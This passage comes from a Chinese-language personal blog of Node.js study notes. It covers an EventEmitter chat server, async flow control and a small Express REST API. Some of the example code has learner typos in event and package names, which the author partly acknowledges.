title="一个PUB/SUB的例子"></a>一个PUB/SUB的例子</h5><p>下面的代码定义了channel事件发射器，并带有一个监听器，可以监听channel中发生的事件并做出响应；</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//定义</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">EventEmitter</span>=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;events&#x27;</span>).<span class="hljs-property">EventEmitter</span>;<br><span class="hljs-keyword">const</span> channel=<span class="hljs-keyword">new</span> <span class="hljs-title class_">EventEmitter</span>();<br>channel.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;join&#x27;</span>,<span class="hljs-function">()=&gt;</span>&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Welcome!&quot;</span>);<br>&#125;)<br><br><span class="hljs-comment">//触发事件/发射事件/join是事件名称，可以为任何值</span><br>channel.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;join&#x27;</span>);<br></code></pre></td></tr></table></figure><p>完整实现代码如下（存在只能输出一个字符的问题，似乎需要上缓存）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> events=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;events&#x27;</span>);<br><span class="hljs-keyword">const</span> net=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;net&#x27;</span>);<br><span class="hljs-keyword">const</span> channel=<span class="hljs-keyword">new</span> events.<span class="hljs-title class_">EventEmitter</span>();<br><span class="hljs-keyword">var</span> fullMessage=<span class="hljs-string">&quot;&quot;</span>;<br><br>channel.<span class="hljs-property">clients</span>=&#123;&#125;;<br>channel.<span class="hljs-property">subscriptions</span>=&#123;&#125;;<br><br>channel.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;join&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">id,client</span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">clients</span>[id]=client;<br>    <span class="hljs-keyword">const</span> welcomeMessage=<span class="hljs-string">`Welcome! <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.listeners(<span class="hljs-string">&#x27;broadcase&#x27;</span>).length+<span class="hljs-number">1</span>&#125;</span> guests online!`</span>;<br>    client.<span class="hljs-title function_">write</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;welcomeMessage&#125;</span>\n`</span>);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">subscriptions</span>[id]=<span class="hljs-function">(<span class="hljs-params">senderId,message</span>)=&gt;</span>&#123;<br>        <span class="hljs-keyword">if</span>(id!=senderId)&#123;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">clients</span>[id].<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;Message from user &quot;</span>+id+<span class="hljs-string">&quot;:&quot;</span>+message+<span class="hljs-string">&quot;.\n&quot;</span>);<br>        &#125;<br>    &#125;;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;broadcase&#x27;</span>,<span class="hljs-variable language_">this</span>.<span class="hljs-property">subscriptions</span>[id]);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;id&#125;</span> has enter the chatroom.\n`</span>);<br>    channel.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;boradcast&#x27;</span>,id,<span class="hljs-string">`<span class="hljs-subst">$&#123;id&#125;</span> has enter the chatroom.\n`</span>);<br>&#125;);<br><br><span class="hljs-comment">//绑定leave事件；</span><br>channel.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;leave&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">id</span>)&#123;<br>    channel.<span class="hljs-title function_">removeListener</span>(<span class="hljs-string">&#x27;broadcast&#x27;</span>,<span class="hljs-variable language_">this</span>.<span class="hljs-property">subscriptions</span>[id]);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;id&#125;</span> has left the chatroom.\n`</span>);<br>    channel.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;boradcast&#x27;</span>,id,<span class="hljs-string">`<span class="hljs-subst">$&#123;id&#125;</span> has left the chatroom.\n`</span>);<br>&#125;);<br><br><span class="hljs-comment">//绑定lshuwdown事件,提出所有用户；</span><br>channel.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;shutdown&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">id</span>)&#123;<br>    channel.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;broadcast&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;The server has shut down.\n&#x27;</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;id&#125;</span> has close the chatroom.\n`</span>);<br>    channel.<span class="hljs-title function_">removeAllListeners</span>(<span class="hljs-string">&#x27;broadcast&#x27;</span>);<br>&#125;);<br><br><span class="hljs-comment">//设定监听器最多的数量为50；</span><br>channel.<span class="hljs-title function_">setMaxListeners</span>(<span class="hljs-number">50</span>);<br><br><span class="hljs-keyword">const</span> server=net.<span class="hljs-title function_">createServer</span>(<span class="hljs-function"><span class="hljs-params">client</span>=&gt;</span>&#123;<br>    <span class="hljs-keyword">const</span> id=<span class="hljs-string">`[<span class="hljs-subst">$&#123;client.remoteAddress&#125;</span>:<span class="hljs-subst">$&#123;client.remotePort&#125;</span>]`</span>;<br>    channel.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;join&#x27;</span>,id,client);<br>    client.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-function"><span class="hljs-params">data</span>=&gt;</span>&#123;<br>        data=data.<span class="hljs-title function_">toString</span>();<br>        <span class="hljs-keyword">if</span>(data===<span class="hljs-string">&#x27;*&#x27;</span>)&#123;<br>            channel.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;shutdown&#x27;</span>,id);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(data===<span class="hljs-string">&#x27;-&#x27;</span>)&#123;<br>            channel.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;leave&#x27;</span>,id);<br>        &#125;<br>        channel.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;broadcase&#x27;</span>,id,data);<br>    &#125;);<br>    client.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;close&#x27;</span>,<span class="hljs-function">()=&gt;</span>&#123;<br>        channel.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;leave&#x27;</span>,id);<br>    &#125;);<br>&#125;);<br><br>server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">8888</span>);<br></code></pre></td></tr></table></figure><h3 id="5-异步开发的难题"><a href="#5-异步开发的难题" class="headerlink" title="5.异步开发的难题"></a>5.异步开发的难题</h3><blockquote><p>创建异步程序时，需要关注：</p><p>1.事件轮询的条件；</p><p>2.程序变量；</p><p>3.其他随程序逻辑执行而发生变化的资源；</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//作用域是如何导致bug出现的</span><br><br><span class="hljs-keyword">function</span>  <span class="hljs-title function_">asyncFunction</span>(<span class="hljs-params">callback</span>)&#123;<br>    <span class="hljs-built_in">setTimeout</span>(callback,<span class="hljs-number">200</span>);<br>&#125;<br><br><span class="hljs-keyword">let</span> color=<span class="hljs-string">&#x27;green&#x27;</span>;<span class="hljs-comment">//初始color</span><br><span class="hljs-title function_">asyncFunction</span>(<span class="hljs-function">()=&gt;</span>&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`The color is <span class="hljs-subst">$&#123;color&#125;</span>.`</span>);<span class="hljs-comment">//等待200ms输出color</span><br>&#125;);<br><br>color=<span class="hljs-string">&#x27;blue&#x27;</span><span class="hljs-comment">//结果为输出blue；</span><br></code></pre></td></tr></table></figure><blockquote><p>JS闭包可以冻结color的值；</p><p>下面的例子对asyncFunction的调用被封装到一个以color为参数的匿名函数里。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">color=<span class="hljs-string">&#x27;blue&#x27;</span><br>(<span class="hljs-function"><span class="hljs-params">color</span>=&gt;</span>&#123;<br>    <span class="hljs-title function_">asyncFunction</span>(<span class="hljs-function">()=&gt;</span>&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`The color is `</span>,color);<br>    &#125;);<br>&#125;)(color);<br><br>color=<span class="hljs-string">&#x27;green&#x27;</span>;<span class="hljs-comment">//结果为输出blue；</span><br></code></pre></td></tr></table></figure><h3 id="6-异步逻辑的顺序化"><a href="#6-异步逻辑的顺序化" class="headerlink" title="6.异步逻辑的顺序化"></a>6.异步逻辑的顺序化</h3><blockquote><p>让一组异步任务顺序执行的概念被Node社区称为流程控制；</p><p>控制分为：串行、并行</p></blockquote><p><img src="https://s3.bmp.ovh/imgs/2023/02/09/b33ca1d4d596f929.jpg"></p><h4 id="（1）串行流程控制"><a href="#（1）串行流程控制" class="headerlink" title="（1）串行流程控制"></a>（1）串行流程控制</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//以下代码用回调让任务顺序执行</span><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Wait 1000ms...&quot;</span>);<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Wait 500ms...&quot;</span>);<br>        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Wait 100ms...&quot;</span>);<br>        &#125;,<span class="hljs-number">100</span>)<br>    &#125;,<span class="hljs-number">500</span>)<br>&#125;,<span class="hljs-number">1000</span>)<br></code></pre></td></tr></table></figure><p>实际情况中可能是读取文件、发送http请求等；</p><h5 id="借助async流程控制工具执行"><a href="#借助async流程控制工具执行" class="headerlink" title="借助async流程控制工具执行"></a>借助async流程控制工具执行</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install async<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-keyword">async</span>=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;async&#x27;</span>);<br><br><span class="hljs-comment">//维护一个顺序数组</span><br><span class="hljs-keyword">async</span>.<span class="hljs-title function_">series</span>([<br>    <span class="hljs-function"><span class="hljs-params">callback</span>=&gt;</span>&#123;<br>        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Wawit 1000ms...&quot;</span>);<br>            <span class="hljs-title function_">callback</span>();<br>        &#125;,<span class="hljs-number">1000</span>);<br>    &#125;,<br>    <span class="hljs-function"><span class="hljs-params">callback</span>=&gt;</span>&#123;<br>        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Wawit 500ms...&quot;</span>);<br>            <span class="hljs-title function_">callback</span>();<br>        &#125;,<span class="hljs-number">500</span>)<br>    &#125;,<br>    <span class="hljs-function"><span class="hljs-params">callback</span>=&gt;</span>&#123;<br>        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Wawit 100ms...&quot;</span>);<br>            <span class="hljs-title function_">callback</span>();<br>        &#125;,<span class="hljs-number">100</span>);<br>    &#125;<br>]);<br></code></pre></td></tr></table></figure><ul><li>可读性、可维护性更强；</li><li>刻意回避回调嵌套；</li></ul><h4 id="（2）实现串行化流程控制"><a href="#（2）实现串行化流程控制" class="headerlink" title="（2）实现串行化流程控制"></a>（2）实现串行化流程控制</h4><ul><li>按照预期执行的顺序维护一个数组；</li><li>FIFO方法完成任务；</li><li>每个任务完成以后调用一个函数来返回任务执行的成功与否；</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">TaskA</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Doing work A!&quot;</span>);<br>    <span class="hljs-title function_">next</span>();<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">TaskB</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Doing work B!&quot;</span>);<br>    <span class="hljs-title function_">next</span>();<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">TaskC</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Doing work C!&quot;</span>);<br>    <span class="hljs-title function_">next</span>();<br>&#125;<br><br><span class="hljs-comment">//维护的一个数组；</span><br><span class="hljs-keyword">const</span> tasks=[<span class="hljs-title class_">TaskA</span>,<span class="hljs-title class_">TaskB</span>,<span class="hljs-title class_">TaskC</span>];<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">err,result</span>)&#123;<br>    <span class="hljs-keyword">if</span>(err) <span class="hljs-keyword">throw</span> err;   <span class="hljs-comment">//如果出错，就抛出错误</span><br>    <span class="hljs-keyword">const</span> currentTask=tasks.<span class="hljs-title function_">shift</span>();<span class="hljs-comment">//没有出错，移动数组；</span><br>    <span class="hljs-keyword">if</span>(currentTask)&#123;<br>       <span class="hljs-title function_">currentTask</span>(result);<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_">next</span>();<br></code></pre></td></tr></table></figure><h4 id="（3）实现并行化流程控制"><a href="#（3）实现并行化流程控制" class="headerlink" title="（3）实现并行化流程控制"></a>（3）实现并行化流程控制</h4><blockquote><p>为了让异步任务并行执行，人需要维护一个数组；但是此时任务的存放顺序无关紧要；</p></blockquote><h4 id="（4）利用社区的工具进行流程控制"><a href="#（4）利用社区的工具进行流程控制" class="headerlink" title="（4）利用社区的工具进行流程控制"></a>（4）利用社区的工具进行流程控制</h4><ul><li>Async</li><li>Step</li><li>Seq</li></ul><h2 id="三、Node-Web"><a href="#三、Node-Web" class="headerlink" title="三、Node Web"></a>三、Node Web</h2><ul><li>创建一个新的Web程序</li><li>搭建RESTful服务</li><li>持久化数据</li><li>使用模板</li></ul><h3 id="1-Node-Web程序结构"><a href="#1-Node-Web程序结构" class="headerlink" title="1.Node Web程序结构"></a>1.Node Web程序结构</h3><ul><li>package.json  包含依赖项列表和运行这个程序的命令的文件；</li><li>public/             静态资源文件夹，css/客户端js都在这；</li><li>node_modules/ 项目的依赖项会安装到这里；</li></ul><h5 id="程序代码"><a href="#程序代码" class="headerlink" title="程序代码"></a>程序代码</h5><ul><li>app.js/index.js          设置程序的代码；</li><li>models/                    数据库模型；</li><li>views/                       用来渲染的页面模板；</li><li>controllers/routes      HTTP请求处理器；</li><li>middleware/              中间件组件；</li></ul><blockquote><p>如何组织程序是我的自由，大部分web框架都很灵活；</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install --save express<br>npm rm express --save<br></code></pre></td></tr></table></figure><p>一个简单的服务器，使用express（）创建一个程序实例，添加路由处理器，然后将实例绑定到一个TCP端口；</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><br><span class="hljs-keyword">const</span> app=<span class="hljs-title function_">express</span>();<br><br><span class="hljs-keyword">const</span> port=process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span> || <span class="hljs-number">3000</span>;<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-function">(<span class="hljs-params">req,res</span>)=&gt;</span>&#123;<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Hello,world!&quot;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(port,<span class="hljs-function">()=&gt;</span>&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Express web app available at localhost:<span class="hljs-subst">$&#123;port&#125;</span>`</span>);<br>&#125;)<br></code></pre></td></tr></table></figure><h5 id="npm脚本"><a href="#npm脚本" class="headerlink" title="npm脚本"></a>npm脚本</h5><blockquote><p>启动服务起的命令（<code>node index.js</code>）可以保存问npm脚本；如下可以使用<code>npm start</code>启动项目；</p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;scripts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>   <span class="hljs-attr">&quot;start&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;node index.js&quot;</span><br> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br></code></pre></td></tr></table></figure><h5 id="搭建一个RESTful-Web服务"><a href="#搭建一个RESTful-Web服务" class="headerlink" title="搭建一个RESTful Web服务"></a>搭建一个RESTful Web服务</h5><ul><li>POST  /articles   </li><li>GET    /articles/:id</li><li>GET    /articles</li><li>DELETE  /articles/:id</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl http://127.0.0.1:3000/articles/0<br>curl -X DELETE http://127.0.0.1:3000/articles/0<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">官方消息体解析器</span><br>npm install --save bodt-parser<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> bodyParser=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><br><span class="hljs-keyword">const</span> articles=[&#123;<span class="hljs-attr">title</span>:<span class="hljs-string">&#x27;NodeJS入门&#x27;</span>&#125;,&#123;<span class="hljs-attr">title</span>:<span class="hljs-string">&#x27;VueJS入门&#x27;</span>&#125;,&#123;<span class="hljs-attr">title</span>:<span class="hljs-string">&#x27;深入浅出VueJS&#x27;</span>&#125;];<br><br><span class="hljs-keyword">const</span> app=<span class="hljs-title function_">express</span>();<br><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;port&#x27;</span>,process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span>||<span class="hljs-number">3000</span>);<br><br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123;<span class="hljs-attr">extended</span>:<span class="hljs-literal">true</span>&#125;));<br><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/articles&#x27;</span>,<span class="hljs-function">(<span class="hljs-params">req,res,next</span>)=&gt;</span>&#123;<br>    res.<span class="hljs-title function_">send</span>(articles);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/articles/:id&#x27;</span>,<span class="hljs-function">(<span class="hljs-params">req,res,next</span>)=&gt;</span>&#123;<br>    <span class="hljs-keyword">const</span> id=req.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Fetching article &quot;</span>,id,<span class="hljs-string">&quot;.&quot;</span>);<br>    res.<span class="hljs-title function_">send</span>(articles[id]);<br>&#125;);<br><br>app.<span class="hljs-title function_">delete</span>(<span class="hljs-string">&#x27;/articles/:id&#x27;</span>,<span class="hljs-function">(<span class="hljs-params">req,res,next</span>)=&gt;</span>&#123;<br>    <span class="hljs-keyword">const</span> id=req.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Deleting article &quot;</span>,id,<span class="hljs-string">&quot;.&quot;</span>);<br>    <span class="hljs-keyword">delete</span> articles[id];<br>    res.<span class="hljs-title function_">send</span>(&#123;<span class="hljs-attr">message</span>:<span class="hljs-string">&#x27;Article has been deleted.&#x27;</span>&#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/articles&#x27;</span>,<span class="hljs-function">(<span class="hljs-params">req,res,next</span>)=&gt;</span>&#123;<br>    <span class="hljs-keyword">const</span> article=&#123;<span class="hljs-attr">title</span>:req.<span class="hljs-property">body</span>.<span class="hljs-property">title</span>&#125;;<br>    articles.<span class="hljs-title function_">push</span>(article);<br>    res.<span class="hljs-title function_">send</span>(articles);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;port&#x27;</span>),<span class="hljs-function">()=&gt;</span>&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;App started on port &#x27;</span>,app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;port&#x27;</span>));<br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>=app;<br></code></pre></td></tr></table></figure><blockquote><p>到这一步为止，跟真正的Web程序差不多了，只需要完成两个新的任务：</p><p>永久保存数据到数据库；</p><p>形成可读版本的文章；</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">模板引擎</span><br>npm install ejs --save<br></code></pre></td></tr></table></figure><h3 id="2-Node-Web开发"><a href="#2-Node-Web开发" class="headerlink" title="2.Node Web开发"></a>2.Node Web开发</h3><blockquote><p>现代Web开发中，使用Node来进行工具和服务的情况越来越多；</p><p>需要负责和配置维护工具库；</p><p>本章使用npm脚本、Gulp和Webpack搭建易于维护的项目；</p></blockquote><h4 id="前端构建工具的优点："><a href="#前端构建工具的优点：" class="headerlink" title="前端构建工具的优点："></a>前端构建工具的优点：</h4><ul><li>代码简单易懂；</li><li>支持代码转译；</li><li>源码映射；</li></ul><h4 id="Webpck"><a href="#Webpck" class="headerlink" title="Webpck"></a>Webpck</h4><ul><li>快速搭建支持增量式结构的构建系统；</li></ul><h2 id="五、服务器端框架"><a href="#五、服务器端框架" class="headerlink" title="五、服务器端框架"></a>五、服务器端框架</h2><ul><li>使用热门的Node Web框架；</li><li>选择合适的框架；</li><li>用Web框架搭建Web程序；</li></ul><h4 id="1-用户画像"><a href="#1-用户画像" class="headerlink" title="1.用户画像"></a>1.用户画像</h4><blockquote><p>假设一个场景，需要做一个内容分发系统，用户需要上传下载法律文件，在线阅读文件；</p><p>徐娅萍生成PDF还有电子商务组件，你会怎么考虑技术栈？</p></blockquote><ul><li>文件上传下载阅读–Express</li><li>生成PDF的微服务–hapi</li><li>电子商务组件–SailJS</li></ul><p>使用用户画像考虑设计问题是通用做法。</p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>Node</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>React</title>
    <link href="/2023/03/27/React/"/>
    <url>/2023/03/27/React/</url>
    
